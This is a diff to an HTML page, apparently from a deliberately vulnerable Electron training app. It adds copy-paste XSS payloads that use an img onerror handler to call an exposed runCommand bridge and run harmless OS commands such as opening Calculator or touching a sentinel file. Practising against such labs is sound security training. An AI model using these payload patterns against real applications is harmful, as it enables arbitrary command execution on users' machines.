@@ -28,9 +28,23 @@
             <code>contextIsolation</code> is true. XSS in the renderer can call
             <code>window.systemAPI.runCommand()</code> to execute arbitrary shell commands.
           </p>
-          <b>Example payload:</b>
-          <pre><code>&lt;img src=x onerror="window.systemAPI.runCommand('open -a Calculator')"&gt;</code></pre>
-          <span class="text-small text-gray">Runs Calculator on macOS. Substitute a command appropriate for your OS.</span>
+          <b>Example payloads (copy/paste into the input below):</b>
+          <div class="example-payloads">
+            <div>
+              <strong>macOS (opens Calculator):</strong>
+              <pre><code>&lt;img src=x onerror="window.systemAPI.runCommand('open -a Calculator')"&gt;</code></pre>
+            </div>
+            <div>
+              <strong>Linux (Ubuntu - sentinel):</strong>
+              <pre><code>&lt;img src=x onerror="window.systemAPI.runCommand('touch /tmp/dvea_rce_sentinel')"&gt;</code></pre>
+              <span class="text-small text-gray">On Ubuntu desktop you can also replace the command with <code>gnome-calculator</code> to open the Calculator. The sentinel ensures an observable effect if no calculator is installed.</span>
+            </div>
+            <div>
+              <strong>Alternative Linux (attempt GUI calculator):</strong>
+              <pre><code>&lt;img src=x onerror="window.systemAPI.runCommand('gnome-calculator || xcalc || xdg-open .')"&gt;</code></pre>
+            </div>
+          </div>
+          <p class="text-small text-gray">Alternatively you can call <code>window.systemAPI.openCalculator()</code> which uses a platform-aware helper exposed by the preload script.</p>
         </div>
         <div class="xss-explanation">
           <strong>Impact:</strong> Full system compromise — read/write files, execute OS commands,
